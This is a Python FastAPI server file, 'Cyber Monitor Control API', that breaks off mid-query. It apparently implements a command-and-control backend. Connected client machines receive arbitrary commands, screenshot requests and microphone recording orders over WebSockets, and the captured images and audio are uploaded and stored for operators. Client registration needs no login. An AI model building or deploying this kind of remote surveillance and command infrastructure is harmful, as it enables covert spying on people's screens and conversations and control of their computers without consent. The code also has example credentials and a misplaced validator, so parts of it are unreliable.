import os
import sys
import logging
from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, Request, status, Query
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from fastapi.responses import JSONResponse
from pydantic import BaseModel, Field, validator
from typing import List, Dict, Optional, Any, Union
from datetime import datetime, timedelta
import secrets
import json
import jwt
import asyncio
import psycopg2
from psycopg2.extras import RealDictCursor
from urllib.parse import urlparse
import ssl
import time
from contextlib import contextmanager

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Create FastAPI app
app = FastAPI(
    title="Cyber Monitor Control API",
    version="3.0",
    description="Client monitoring and management system",
    docs_url="/docs",
    redoc_url="/redoc",
    openapi_url="/openapi.json"
)

# CORS Configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # In production, restrict to your frontend domain
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ========== ENVIRONMENT VARIABLES ==========
SUPABASE_URL = os.getenv("SUPABASE_URL", "")
SUPABASE_KEY = os.getenv("SUPABASE_KEY", "")
JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", secrets.token_urlsafe(32))
PORT = int(os.getenv("PORT", "8000"))

# Security
security = HTTPBearer()

# ========== DATABASE CONNECTION ==========
class Database:
    _instance = None
    
    @classmethod
    def get_instance(cls):
        if cls._instance is None:
            cls._instance = Database()
        return cls._instance
    
    def __init__(self):
        self.conn = None
        self.connect()
    
    def connect(self):
        """Connect to Supabase database"""
        try:
            # Try multiple ways to get database URL
            db_url = self._get_database_url()
            
            if not db_url:
                logger.warning("No database URL found - running in development mode")
                return None
            
            # Parse for logging (without password)
            parsed = urlparse(db_url)
            safe_url = f"postgresql://{parsed.username}:***@{parsed.hostname}:{parsed.port}{parsed.path}"
            logger.info(f"Connecting to database: {safe_url}")
            
            # Connect with SSL for Supabase
            self.conn = psycopg2.connect(
                db_url,
                cursor_factory=RealDictCursor,
                connect_timeout=10,
                sslmode='require',  # Supabase requires SSL
                keepalives=1,
                keepalives_idle=30,
                keepalives_interval=10,
                keepalives_count=5
            )
            
            logger.info("✅ Database connected successfully")
            
            # Test the connection
            with self.get_cursor() as cursor:
                cursor.execute("SELECT version()")
                version = cursor.fetchone()
                logger.info(f"Database version: {version['version']}")
            
            return self.conn
            
        except Exception as e:
            logger.error(f"❌ Database connection failed: {e}")
            self.conn = None
            return None
    
    def _get_database_url(self):
        """Get database connection string from environment"""
        # 1. Try DATABASE_URL first
        db_url = os.getenv("DATABASE_URL")
        if db_url:
            if db_url.startswith("postgresql://"):
                return db_url
            elif db_url.startswith("postgres://"):
                return db_url.replace("postgres://", "postgresql://", 1)
        
        # 2. Try constructing from Supabase components
        supabase_host = os.getenv("SUPABASE_HOST", "aws-0-us-east-1.pooler.supabase.com")
        supabase_port = os.getenv("SUPABASE_PORT", "5432")
        supabase_db = os.getenv("SUPABASE_DB", "postgres")
        supabase_user = os.getenv("SUPABASE_USER", "postgres")
        supabase_password = os.getenv("SUPABASE_PASSWORD")
        
        if supabase_password:
            return f"postgresql://{supabase_user}:{supabase_password}@{supabase_host}:{supabase_port}/{supabase_db}"
        
        # 3. Try extracting from SUPABASE_URL if it contains db info
        if SUPABASE_URL and "@" in SUPABASE_URL:
            return SUPABASE_URL
        
        return None
    
    def get_connection(self):
        """Get database connection, reconnect if needed"""
        try:
            if self.conn is None or self.conn.closed:
                logger.info("Reconnecting to database...")
                self.connect()
            
            # Test connection
            self.conn.cursor().execute("SELECT 1")
            return self.conn
        except:
            logger.warning("Connection lost, attempting to reconnect...")
            self.connect()
            return self.conn if self.conn else None
    
    @contextmanager
    def get_cursor(self):
        """Context manager for database cursor"""
        conn = self.get_connection()
        if conn is None:
            raise Exception("No database connection")
        
        cursor = conn.cursor()
        try:
            yield cursor
            conn.commit()
        except Exception as e:
            conn.rollback()
            raise e
        finally:
            cursor.close()
    
    def execute_query(self, query: str, params: tuple = None):
        """Execute a query and return results"""
        with self.get_cursor() as cursor:
            cursor.execute(query, params or ())
            return cursor.fetchall()
    
    def execute_update(self, query: str, params: tuple = None):
        """Execute an update query"""
        with self.get_cursor() as cursor:
            cursor.execute(query, params or ())
            return cursor.rowcount

# Initialize database
db = Database.get_instance()

# ========== DATA MODELS ==========
class LoginRequest(BaseModel):
    email: str = Field(..., example="kizer", min_length=1)
    password: str = Field(..., example="kidraper67", min_length=1)

class ClientRegister(BaseModel):
    client_id: str = Field(..., example="client-001", min_length=1)
    name: str = Field(..., example="Office Computer", min_length=1)
    ip_address: str = Field(..., example="192.168.1.100")
    os_info: str = Field(default="Unknown", example="Windows 11")
    location: Optional[str] = Field(default=None, example="New York, NY")
    tags: Optional[List[str]] = Field(default_factory=list)

class CommandRequest(BaseModel):
    client_id: str = Field(..., example="client-001", min_length=1)
    command: str = Field(..., example="get_processes", min_length=1)
    parameters: Dict[str, Any] = Field(default_factory=dict)

class CommandResponse(BaseModel):
    command_id: str
    client_id: str
    command: str
    parameters: Dict[str, Any]
    status: str
    result: Optional[str] = None
    error: Optional[str] = None
    created_at: str
    completed_at: Optional[str] = None

class ScreenshotUpload(BaseModel):
    client_id: str = Field(..., example="client-001", min_length=1)
    image_data: str = Field(..., description="Base64 encoded image", min_length=100)
    filename: str = Field(..., example="screenshot_2024.png")
    thumbnail: Optional[str] = Field(default=None, description="Base64 encoded thumbnail")

class AudioUpload(BaseModel):
    client_id: str = Field(..., example="client-001", min_length=1)
    audio_data: str = Field(..., description="Base64 encoded audio", min_length=100)
    filename: str = Field(..., example="recording_2024.mp3")
    duration: Optional[float] = Field(default=None, ge=0)

class LogEntry(BaseModel):
    client_id: str = Field(..., example="client-001", min_length=1)
    log_type: str = Field(..., example="info")
    message: str = Field(..., example="System started", min_length=1)
    details: Optional[Dict[str, Any]] = Field(default_factory=dict)

class SystemInfo(BaseModel):
    client_id: str = Field(..., example="client-001", min_length=1)
    info: Dict[str, Any] = Field(..., description="System information JSON")

# FIXED: Use pattern instead of regex
class PaginationParams(BaseModel):
    page: int = Field(default=1, ge=1)
    limit: int = Field(default=50, ge=1, le=1000)
    sort_by: str = Field(default="created_at")
    
    @validator('sort_order')
    def validate_sort_order(cls, v):
        if v not in ['asc', 'desc']:
            raise ValueError('sort_order must be "asc" or "desc"')
        return v
    
    sort_order: str = Field(default="desc")

# ========== SECURITY FUNCTIONS ==========
def create_jwt_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
    """Create JWT token"""
    to_encode = data.copy()
    if expires_delta:
        expire = datetime.utcnow() + expires_delta
    else:
        expire = datetime.utcnow() + timedelta(hours=24)
    
    to_encode.update({
        "exp": expire,
        "iat": datetime.utcnow(),
        "iss": "cyber-monitor-api"
    })
    encoded_jwt = jwt.encode(to_encode, JWT_SECRET_KEY, algorithm="HS256")
    return encoded_jwt

def verify_jwt_token(token: str) -> Optional[dict]:
    """Verify JWT token"""
    try:
        payload = jwt.decode(
            token, 
            JWT_SECRET_KEY, 
            algorithms=["HS256"],
            options={"verify_exp": True, "verify_iss": True}
        )
        return payload
    except jwt.ExpiredSignatureError:
        logger.warning("JWT token expired")
        return None
    except jwt.InvalidTokenError as e:
        logger.warning(f"Invalid JWT token: {e}")
        return None

async def authenticate_user(credentials: HTTPAuthorizationCredentials = Depends(security)) -> dict:
    """Verify JWT token from request"""
    token = credentials.credentials
    payload = verify_jwt_token(token)
    
    if not payload:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid or expired authentication token",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    return payload

async def authenticate_admin(payload: dict = Depends(authenticate_user)) -> dict:
    """Verify user is admin"""
    if not payload.get("is_admin", False):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail="Admin privileges required"
        )
    return payload

# ========== DATABASE OPERATIONS ==========
def verify_password_sql(email: str, password: str) -> bool:
    """Verify password using PostgreSQL crypt function"""
    try:
        with db.get_cursor() as cursor:
            cursor.execute("""
                SELECT password_hash = crypt(%s, password_hash) as password_match
                FROM users 
                WHERE email = %s AND is_active = true
            """, (password, email))
            
            result = cursor.fetchone()
            return result and result['password_match']
    except Exception as e:
        logger.error(f"Password verification error: {e}")
        return False

def get_user_by_email(email: str):
    """Get user by email"""
    try:
        with db.get_cursor() as cursor:
            cursor.execute("""
                SELECT id, email, is_admin, last_login
                FROM users 
                WHERE email = %s AND is_active = true
            """, (email,))
            return cursor.fetchone()
    except Exception as e:
        logger.error(f"Get user error: {e}")
        return None

def update_last_login(user_id: str):
    """Update user's last login time"""
    try:
        with db.get_cursor() as cursor:
            cursor.execute("""
                UPDATE users 
                SET last_login = NOW() 
                WHERE id = %s
            """, (user_id,))
        logger.info(f"Updated last login for user: {user_id}")
    except Exception as e:
        logger.error(f"Update last login error: {e}")

def get_client_by_id(client_identifier: str):
    """Get client by client_id"""
    try:
        with db.get_cursor() as cursor:
            cursor.execute("""
                SELECT id, client_id, name, ip_address, os_info, online, last_seen, registered_at
                FROM clients WHERE client_id = %s
            """, (client_identifier,))
            return cursor.fetchone()
    except Exception as e:
        logger.error(f"Get client error: {e}")
        return None

# ========== WEBSOCKET MANAGER ==========
class ConnectionManager:
    def __init__(self):
        self.client_connections: Dict[str, WebSocket] = {}
        self.admin_connections: List[WebSocket] = []
        self.connection_times: Dict[str, datetime] = {}
        
    async def connect_admin(self, websocket: WebSocket, admin_id: str = None):
        await websocket.accept()
        admin_id = admin_id or f"admin-{len(self.admin_connections)}"
        self.admin_connections.append(websocket)
        self.connection_times[admin_id] = datetime.utcnow()
        logger.info(f"👑 Admin connected: {admin_id}. Total admins: {len(self.admin_connections)}")
        return admin_id

    async def connect_client(self, websocket: WebSocket, client_id: str):
        await websocket.accept()
        self.client_connections[client_id] = websocket
        self.connection_times[client_id] = datetime.utcnow()
        logger.info(f"🖥️  Client connected: {client_id}. Total clients: {len(self.client_connections)}")
        
        # Update client status in database
        try:
            with db.get_cursor() as cursor:
                cursor.execute("""
                    UPDATE clients 
                    SET online = true, last_seen = NOW()
                    WHERE client_id = %s
                """, (client_id,))
        except Exception as e:
            logger.error(f"Client status update error: {e}")
        
        # Notify all admins
        await self.notify_admins({
            "type": "client_connected",
            "client_id": client_id,
            "timestamp": datetime.utcnow().isoformat(),
            "total_clients": len(self.client_connections)
        })

    def disconnect(self, websocket: WebSocket):
        """Disconnect a client or admin"""
        # Check if it's an admin
        if websocket in self.admin_connections:
            self.admin_connections.remove(websocket)
            logger.info(f"👑 Admin disconnected. Total admins: {len(self.admin_connections)}")
            return
        
        # Check if it's a client
        client_id = None
        for cid, ws in self.client_connections.items():
            if ws == websocket:
                client_id = cid
                break
        
        if client_id:
            del self.client_connections[client_id]
            logger.info(f"🖥️  Client disconnected: {client_id}. Total clients: {len(self.client_connections)}")
            
            # Update client status in database
            try:
                with db.get_cursor() as cursor:
                    cursor.execute("""
                        UPDATE clients 
                        SET online = false
                        WHERE client_id = %s
                    """, (client_id,))
            except Exception as e:
                logger.error(f"Client status update error: {e}")
            
            # Notify admins
            asyncio.create_task(self.notify_admins({
                "type": "client_disconnected",
                "client_id": client_id,
                "timestamp": datetime.utcnow().isoformat(),
                "total_clients": len(self.client_connections)
            }))

    async def notify_admins(self, message: dict):
        """Send message to all admin connections"""
        disconnected = []
        for connection in self.admin_connections:
            try:
                await connection.send_json(message)
            except Exception as e:
                logger.error(f"Failed to send to admin: {e}")
                disconnected.append(connection)
        
        # Remove disconnected admins
        for connection in disconnected:
            if connection in self.admin_connections:
                self.admin_connections.remove(connection)

    async def send_to_client(self, client_id: str, message: dict) -> bool:
        """Send message to specific client"""
        if client_id in self.client_connections:
            try:
                await self.client_connections[client_id].send_json(message)
                return True
            except Exception as e:
                logger.error(f"Failed to send to client {client_id}: {e}")
                # Remove disconnected client
                if client_id in self.client_connections:
                    del self.client_connections[client_id]
                return False
        return False
    
    def get_connection_stats(self) -> dict:
        """Get connection statistics"""
        now = datetime.utcnow()
        client_uptimes = {}
        
        for client_id, connect_time in self.connection_times.items():
            if client_id in self.client_connections:
                uptime = (now - connect_time).total_seconds()
                client_uptimes[client_id] = uptime
        
        return {
            "total_clients": len(self.client_connections),
            "total_admins": len(self.admin_connections),
            "client_uptimes": client_uptimes
        }

manager = ConnectionManager()

# ========== API ROUTES ==========
@app.post("/api/login", response_model=dict)
async def login(data: LoginRequest):
    """Login endpoint"""
    try:
        logger.info(f"Login attempt for user: {data.email}")
        
        # Verify password
        if not verify_password_sql(data.email, data.password):
            logger.warning(f"Invalid credentials for user: {data.email}")
            raise HTTPException(status_code=401, detail="Invalid credentials")
        
        # Get user details
        user = get_user_by_email(data.email)
        if not user:
            raise HTTPException(status_code=401, detail="User not found")
        
        logger.info(f"User authenticated: {user['email']}")
        
        # Create JWT token
        token_data = {
            "sub": user["email"],
            "email": user["email"],
            "is_admin": user.get("is_admin", False),
            "user_id": str(user["id"])
        }
        access_token = create_jwt_token(token_data)
        
        # Update last login
        update_last_login(user["id"])
        
        return {
            "success": True,
            "token": access_token,
            "user": {
                "email": user["email"],
                "is_admin": user.get("is_admin", False),
                "user_id": str(user["id"])
            },
            "expires_in": 86400  # 24 hours in seconds
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Login error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/register-client", response_model=dict)
async def register_client(data: ClientRegister, request: Request):
    """Register a new client"""
    try:
        # Get client IP from request
        if not data.ip_address or data.ip_address == "127.0.0.1":
            client_ip = request.headers.get('X-Forwarded-For', request.client.host)
            if client_ip:
                data.ip_address = client_ip.split(',')[0].strip()
            else:
                data.ip_address = "Unknown"
        
        with db.get_cursor() as cursor:
            # Check if client exists
            cursor.execute("SELECT id FROM clients WHERE client_id = %s", (data.client_id,))
            existing_client = cursor.fetchone()
            
            if existing_client:
                # Update existing client
                cursor.execute("""
                    UPDATE clients 
                    SET name = %s, ip_address = %s, os_info = %s, 
                        last_seen = NOW(), online = true, updated_at = NOW()
                    WHERE client_id = %s
                    RETURNING id
                """, (data.name, data.ip_address, data.os_info, data.client_id))
                client_id = cursor.fetchone()["id"]
                action = "updated"
            else:
                # Create new client
                cursor.execute("""
                    INSERT INTO clients (client_id, name, ip_address, os_info, last_seen, online)
                    VALUES (%s, %s, %s, %s, NOW(), true)
                    RETURNING id
                """, (data.client_id, data.name, data.ip_address, data.os_info))
                client_id = cursor.fetchone()["id"]
                action = "registered"
            
            # Add log entry
            try:
                cursor.execute("""
                    INSERT INTO logs (client_id, log_type, message)
                    VALUES (%s, 'info', %s)
                """, (client_id, f"Client {action}: {data.name} ({data.client_id})"))
            except Exception as e:
                logger.error(f"Log insertion error: {e}")
        
        logger.info(f"Client {action}: {data.client_id}")
        return {
            "success": True, 
            "message": f"Client {action} successfully",
            "client_id": data.client_id,
            "action": action
        }
        
    except psycopg2.errors.UniqueViolation:
        raise HTTPException(status_code=400, detail="Client ID already exists")
    except Exception as e:
        logger.error(f"Client registration error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/clients", response_model=dict)
async def get_clients(
    user: dict = Depends(authenticate_user),
    page: int = Query(1, ge=1),
    limit: int = Query(50, ge=1, le=1000),
    online_only: bool = Query(False),
    search: Optional[str] = Query(None)
):
    """Get all clients with pagination"""
    try:
        offset = (page - 1) * limit
        
        with db.get_cursor() as cursor:
            # Build query
            query = """
                SELECT id, client_id, name, ip_address, os_info, 
                       online, last_seen, registered_at, created_at
                FROM clients 
                WHERE 1=1
            """
            params = []
            
            if online_only:
                query += " AND online = true"
            
            if search:
                query += " AND (client_id ILIKE %s OR name ILIKE %s OR ip_address ILIKE %s)"
                search_term = f"%{search}%"
                params.extend([search_term, search_term, search_term])
            
            # Add ordering and pagination
            query += " ORDER BY last_seen DESC NULLS LAST LIMIT %s OFFSET %s"
            params.extend([limit, offset])
            
            cursor.execute(query, params)
            clients = cursor.fetchall()
            
            # Get total count
            count_query = "SELECT COUNT(*) as total FROM clients WHERE 1=1"
            count_params = []
            
            if online_only:
                count_query += " AND online = true"
            
            if search:
                count_query += " AND (client_id ILIKE %s OR name ILIKE %s OR ip_address ILIKE %s)"
                search_term = f"%{search}%"
                count_params.extend([search_term, search_term, search_term])
            
            cursor.execute(count_query, count_params)
            total = cursor.fetchone()["total"]
            
            # Convert datetime objects to ISO format strings
            for client in clients:
                for key in ['last_seen', 'registered_at', 'created_at']:
                    if client[key]:
                        client[key] = client[key].isoformat()
        
        return {
            "success": True,
            "clients": clients,
            "pagination": {
                "page": page,
                "limit": limit,
                "total": total,
                "pages": (total + limit - 1) // limit
            }
        }
    except Exception as e:
        logger.error(f"Get clients error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/client/{client_id}", response_model=dict)
async def get_client(client_id: str, user: dict = Depends(authenticate_user)):
    """Get specific client details"""
    try:
        client = get_client_by_id(client_id)
        if not client:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Convert datetime objects
        for key in ['last_seen', 'registered_at']:
            if client[key]:
                client[key] = client[key].isoformat()
        
        # Get recent logs for this client
        with db.get_cursor() as cursor:
            cursor.execute("""
                SELECT log_type, message, created_at
                FROM logs 
                WHERE client_id = (SELECT id FROM clients WHERE client_id = %s)
                ORDER BY created_at DESC 
                LIMIT 20
            """, (client_id,))
            logs = cursor.fetchall()
            
            for log in logs:
                if log['created_at']:
                    log['created_at'] = log['created_at'].isoformat()
        
        return {
            "success": True,
            "client": client,
            "recent_logs": logs,
            "is_online": client_id in manager.client_connections
        }
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Get client error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/command", response_model=dict)
async def send_command(data: CommandRequest, user: dict = Depends(authenticate_user)):
    """Send command to client"""
    try:
        # Get client from database
        client = get_client_by_id(data.client_id)
        if not client:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Generate command ID
        command_id = f"cmd-{int(time.time())}-{secrets.token_hex(4)}"
        
        # Store command in database
        with db.get_cursor() as cursor:
            cursor.execute("""
                INSERT INTO commands (client_id, command, parameters, status)
                VALUES ((SELECT id FROM clients WHERE client_id = %s), %s, %s::jsonb, 'pending')
                RETURNING id
            """, (data.client_id, data.command, json.dumps(data.parameters)))
            
            db_command_id = cursor.fetchone()["id"]
        
        # Try to send via WebSocket
        sent = await manager.send_to_client(data.client_id, {
            "type": "command",
            "command_id": str(db_command_id),
            "command": data.command,
            "parameters": data.parameters,
            "timestamp": datetime.utcnow().isoformat(),
            "from_user": user["email"]
        })
        
        if not sent:
            # Update command status if WebSocket failed
            with db.get_cursor() as cursor:
                cursor.execute("""
                    UPDATE commands 
                    SET status = 'failed', error = 'Client not connected'
                    WHERE id = %s
                """, (db_command_id,))
        
        return {
            "success": True,
            "command_id": str(db_command_id),
            "sent_via_websocket": sent,
            "client_id": data.client_id,
            "message": "Command queued for execution"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Send command error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/commands", response_model=dict)
async def get_commands(
    user: dict = Depends(authenticate_user),
    client_id: Optional[str] = Query(None),
    status: Optional[str] = Query(None),
    page: int = Query(1, ge=1),
    limit: int = Query(50, ge=1, le=1000)
):
    """Get recent commands"""
    try:
        offset = (page - 1) * limit
        
        with db.get_cursor() as cursor:
            # Build query
            query = """
                SELECT c.id, cl.client_id, cl.name as client_name, 
                       c.command, c.parameters, c.status, c.result, c.error,
                       c.created_at, c.completed_at
                FROM commands c
                JOIN clients cl ON c.client_id = cl.id
                WHERE 1=1
            """
            params = []
            
            if client_id:
                query += " AND cl.client_id = %s"
                params.append(client_id)
            
            if status:
                query += " AND c.status = %s"
                params.append(status)
            
            # Add ordering and pagination
            query += " ORDER BY c.created_at DESC LIMIT %s OFFSET %s"
            params.extend([limit, offset])
            
            cursor.execute(query, params)
            commands = cursor.fetchall()
            
            # Get total count
            count_query = """
                SELECT COUNT(*) as total
                FROM commands c
                JOIN clients cl ON c.client_id = cl.id
                WHERE 1=1
            """
            count_params = []
            
            if client_id:
                count_query += " AND cl.client_id = %s"
                count_params.append(client_id)
            
            if status:
                count_query += " AND c.status = %s"
                count_params.append(status)
            
            cursor.execute(count_query, count_params)
            total = cursor.fetchone()["total"]
            
            # Format the response
            formatted_commands = []
            for cmd in commands:
                formatted_cmd = dict(cmd)
                formatted_cmd["client"] = {
                    "client_id": cmd["client_id"],
                    "name": cmd["client_name"]
                }
                # Convert datetime objects
                for key in ['created_at', 'completed_at']:
                    if formatted_cmd[key]:
                        formatted_cmd[key] = formatted_cmd[key].isoformat()
                del formatted_cmd["client_name"]
                formatted_commands.append(formatted_cmd)
        
        return {
            "success": True,
            "commands": formatted_commands,
            "pagination": {
                "page": page,
                "limit": limit,
                "total": total,
                "pages": (total + limit - 1) // limit
            }
        }
    except Exception as e:
        logger.error(f"Get commands error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/screenshot/{client_id}", response_model=dict)
async def request_screenshot(client_id: str, user: dict = Depends(authenticate_user)):
    """Request screenshot from client"""
    try:
        # Check if client exists
        client = get_client_by_id(client_id)
        if not client:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Send via WebSocket
        sent = await manager.send_to_client(client_id, {
            "type": "screenshot_request",
            "timestamp": datetime.utcnow().isoformat(),
            "from_user": user["email"]
        })
        
        if sent:
            return {
                "success": True,
                "message": "Screenshot request sent",
                "client_id": client_id
            }
        else:
            raise HTTPException(status_code=404, detail="Client not connected")
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Screenshot request error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/upload-screenshot", response_model=dict)
async def upload_screenshot(data: ScreenshotUpload, user: dict = Depends(authenticate_user)):
    """Upload screenshot from client"""
    try:
        client = get_client_by_id(data.client_id)
        if not client:
            raise HTTPException(status_code=404, detail="Client not found")
        
        with db.get_cursor() as cursor:
            # Store screenshot
            cursor.execute("""
                INSERT INTO screenshots (client_id, image_data, filename, thumbnail)
                VALUES ((SELECT id FROM clients WHERE client_id = %s), %s, %s, %s)
                RETURNING id, created_at
            """, (data.client_id, data.image_data, data.filename, data.thumbnail))
            
            screenshot_result = cursor.fetchone()
            screenshot_id = str(screenshot_result['id'])
        
        # Notify admins
        await manager.notify_admins({
            "type": "screenshot_received",
            "client_id": data.client_id,
            "screenshot_id": screenshot_id,
            "filename": data.filename,
            "timestamp": datetime.utcnow().isoformat()
        })
        
        return {
            "success": True,
            "screenshot_id": screenshot_id,
            "client_id": data.client_id,
            "filename": data.filename,
            "created_at": screenshot_result['created_at'].isoformat()
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Screenshot upload error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/screenshots", response_model=dict)
async def get_screenshots(
    user: dict = Depends(authenticate_user),
    client_id: Optional[str] = Query(None),
    page: int = Query(1, ge=1),
    limit: int = Query(12, ge=1, le=100)
):
    """Get recent screenshots"""
    try:
        offset = (page - 1) * limit
        
        with db.get_cursor() as cursor:
            # Build query
            query = """
                SELECT s.id, cl.client_id, cl.name as client_name, 
                       s.filename, s.created_at
                FROM screenshots s
                JOIN clients cl ON s.client_id = cl.id
                WHERE 1=1
            """
            params = []
            
            if client_id:
                query += " AND cl.client_id = %s"
                params.append(client_id)
            
            # Add ordering and pagination
            query += " ORDER BY s.created_at DESC LIMIT %s OFFSET %s"
            params.extend([limit, offset])
            
            cursor.execute(query, params)
            screenshots = cursor.fetchall()
            
            # Get total count
            count_query = """
                SELECT COUNT(*) as total
                FROM screenshots s
                JOIN clients cl ON s.client_id = cl.id
                WHERE 1=1
            """
            count_params = []
            
            if client_id:
                count_query += " AND cl.client_id = %s"
                count_params.append(client_id)
            
            cursor.execute(count_query, count_params)
            total = cursor.fetchone()["total"]
            
            # Format the response
            formatted_screenshots = []
            for scr in screenshots:
                formatted_scr = dict(scr)
                formatted_scr["client"] = {
                    "client_id": scr["client_id"],
                    "name": scr["client_name"]
                }
                # Convert datetime objects
                if formatted_scr["created_at"]:
                    formatted_scr["created_at"] = formatted_scr["created_at"].isoformat()
                del formatted_scr["client_name"]
                formatted_screenshots.append(formatted_scr)
        
        return {
            "success": True,
            "screenshots": formatted_screenshots,
            "pagination": {
                "page": page,
                "limit": limit,
                "total": total,
                "pages": (total + limit - 1) // limit
            }
        }
    except Exception as e:
        logger.error(f"Get screenshots error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/audio/{client_id}/record", response_model=dict)
async def record_audio(
    client_id: str, 
    duration: int = Query(10, ge=1, le=600),
    user: dict = Depends(authenticate_user)
):
    """Request audio recording from client"""
    try:
        client = get_client_by_id(client_id)
        if not client:
            raise HTTPException(status_code=404, detail="Client not found")
        
        # Send via WebSocket
        sent = await manager.send_to_client(client_id, {
            "type": "audio_record",
            "duration": duration,
            "timestamp": datetime.utcnow().isoformat(),
            "from_user": user["email"]
        })
        
        if sent:
            return {
                "success": True,
                "message": f"Audio recording requested for {duration} seconds",
                "client_id": client_id,
                "duration": duration
            }
        else:
            raise HTTPException(status_code=404, detail="Client not connected")
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Audio record request error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.post("/api/upload-audio", response_model=dict)
async def upload_audio(data: AudioUpload, user: dict = Depends(authenticate_user)):
    """Upload audio recording from client"""
    try:
        client = get_client_by_id(data.client_id)
        if not client:
            raise HTTPException(status_code=404, detail="Client not found")
        
        with db.get_cursor() as cursor:
            # Store audio
            cursor.execute("""
                INSERT INTO audio_recordings (client_id, audio_data, filename, duration)
                VALUES ((SELECT id FROM clients WHERE client_id = %s), %s, %s, %s)
                RETURNING id, created_at
            """, (data.client_id, data.audio_data, data.filename, data.duration))
            
            audio_result = cursor.fetchone()
            audio_id = str(audio_result['id'])
        
        # Notify admins
        await manager.notify_admins({
            "type": "audio_received",
            "client_id": data.client_id,
            "audio_id": audio_id,
            "filename": data.filename,
            "duration": data.duration,
            "timestamp": datetime.utcnow().isoformat()
        })
        
        return {
            "success": True,
            "audio_id": audio_id,
            "client_id": data.client_id,
            "filename": data.filename,
            "duration": data.duration,
            "created_at": audio_result['created_at'].isoformat()
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Audio upload error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/logs", response_model=dict)
async def get_logs(
    user: dict = Depends(authenticate_user),
    client_id: Optional[str] = Query(None),
    log_type: Optional[str] = Query(None),
    page: int = Query(1, ge=1),
    limit: int = Query(100, ge=1, le=1000)
):
    """Get system logs"""
    try:
        offset = (page - 1) * limit
        
        with db.get_cursor() as cursor:
            # Build query
            query = """
                SELECT l.id, cl.client_id, cl.name as client_name, 
                       l.log_type, l.message, l.created_at
                FROM logs l
                JOIN clients cl ON l.client_id = cl.id
                WHERE 1=1
            """
            params = []
            
            if client_id:
                query += " AND cl.client_id = %s"
                params.append(client_id)
            
            if log_type and log_type != "all":
                query += " AND l.log_type = %s"
                params.append(log_type)
            
            # Add ordering and pagination
            query += " ORDER BY l.created_at DESC LIMIT %s OFFSET %s"
            params.extend([limit, offset])
            
            cursor.execute(query, params)
            logs = cursor.fetchall()
            
            # Get total count
            count_query = """
                SELECT COUNT(*) as total
                FROM logs l
                JOIN clients cl ON l.client_id = cl.id
                WHERE 1=1
            """
            count_params = []
            
            if client_id:
                count_query += " AND cl.client_id = %s"
                count_params.append(client_id)
            
            if log_type and log_type != "all":
                count_query += " AND l.log_type = %s"
                count_params.append(log_type)
            
            cursor.execute(count_query, count_params)
            total = cursor.fetchone()["total"]
            
            # Format the response
            formatted_logs = []
            for log in logs:
                formatted_log = dict(log)
                formatted_log["client"] = {
                    "client_id": log["client_id"],
                    "name": log["client_name"]
                }
                # Convert datetime objects
                if formatted_log["created_at"]:
                    formatted_log["created_at"] = formatted_log["created_at"].isoformat()
                del formatted_log["client_name"]
                formatted_logs.append(formatted_log)
        
        return {
            "success": True,
            "logs": formatted_logs,
            "pagination": {
                "page": page,
                "limit": limit,
                "total": total,
                "pages": (total + limit - 1) // limit
            }
        }
    except Exception as e:
        logger.error(f"Get logs error: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@app.get("/api/stats", response_model=dict)
async def get_stats(user: dict = Depends(authenticate_user)):
    """Get system statistics"""
    try:
        with db.get_cursor() as cursor:
            # Get client stats
            cursor.execute("""
                SELECT 
                    COUNT(*) as total_clients,
                    COUNT(*) FILTER (WHERE online = true) as online_clients,
                    COUNT(*) FILTER (WHERE DATE(last_seen) = CURRENT_DATE) as active_today
                FROM clients
            """)
            client_stats = cursor.fetchone()
            
            # Get command stats
            cursor.execute("""
                SELECT 
                    COUNT(*) as total_commands,
                    COUNT(*) FILTER (WHERE status = 'completed') as completed_commands,
                    COUNT(*) FILTER (WHERE status = 'failed') as failed_commands,
                    COUNT(*) FILTER (WHERE DATE(created_at) = CURRENT_DATE) as commands_today
                FROM commands
            """)
            command_stats = cursor.fetchone()
            
            # Get media stats
            cursor.execute("""
                SELECT 
                    COUNT(*) as total_screenshots,
                    COUNT(*) as total_audio_recordings
                FROM (
                    SELECT id FROM screenshots 
                    UNION ALL
                    SELECT id FROM audio_recordings
                ) media
            """)
            media_stats = cursor.fetchone()
            
            # Get recent activity
            cursor.execute("""
                SELECT 
                    'client_connect' as type,
                    client_id,
                    created_at as timestamp
                FROM logs 
